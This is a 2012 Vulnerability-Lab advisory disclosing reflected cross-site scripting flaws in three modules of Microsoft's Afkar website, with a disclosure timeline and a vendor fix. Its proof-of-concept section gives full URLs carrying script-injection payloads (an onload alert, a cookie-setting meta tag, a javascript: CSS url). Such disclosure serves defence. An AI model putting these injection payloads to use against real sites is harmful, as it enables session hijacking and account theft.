Title:
======
Microsoft AFKAR Website Service - Cross Site Vulnerabilities


Date:
=====
2012-04-14


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=4797

MSRC ID: 12328nj


VL-ID:
=====
479


Introduction:
=============
Afkar is an Arabic word that means “ideas”. Microsoft Afkar gives Arabic users from all over the world the chance to play
with cool new tools and ideas coming out of Cairo Microsoft Innovation Lab. 

(Copy of the Vendor Homepage: http://afkar.microsoft.com )



Abstract:
=========
A Vulnerability Laboratory Researcher discovered multiple non-persistent Cross Site Scripting Vulnerabilities on Microsofts Afkar Website.


Report-Timeline:
================
2012-03-24:	Vendor Notification
2012-03-26:	Vendor Response/Feedback
2012-04-08:	Vendor Fix/Patch 
2012-04-14:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Low


Details:
========
Multiple client side cross site scripting vulnerabilities are detected on Microsofts Afkar Service Website.
The vulnerability allows an attacker (remote) to hijack customer/moderator/admin sessions with medium required user inter 
action. Successful exploitation can result in account steal or client side context manipulation when processing affected module
application requests.

Vulnerable Module(s): 
						[+] autocompleterservice
						[+] transliterateservice
						[+] getprayers


Proof of Concept:
=================
The vulnerabilities cna be exploited by remote attacker with medium required user inter aciton. For demonstration or reproduce ...


http://afkar.microsoft.com:80/autocompleteservice/services/autocompleterservice.svc/autocomplete?languageName=
Arabic&query=1<body+onload=alert("vlabs")>&count=5&callback=Activate&rosterIndex=0&guid=noguidyet


http://afkar.microsoft.com:80/webmarenservice/services/transliterateservice.svc/transliterate?languageName=
Arabic&query=a&count=5&callback=Activate&rosterIndex=1&guid=<meta+http-equiv='Set-cookie'+content='cookiename=
cookievalue'>&contextPhrasesPre=111-222-1933email@address.tst&contextPhrasePost=djdj@jfh.com


http://afkar.microsoft.com/answers/getprayers?q=1'+style='background:url(JaVaScRiPt:alert(/vulnerable/))'+invalidparam='


Risk:
=====
The security risk of the non persistent cross site scripting vulnerabilities are estimated as low(+).


Credits:
========
Vulnerability Research Laboratory - Mohd. Shadab Siddiqui  (gr4yf0x)



Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2012|Vulnerability-Lab




-- 
VULNERABILITY RESEARCH LABORATORY TEAM
Website: www.vulnerability-lab.com
Mail: research@vulnerability-lab.com

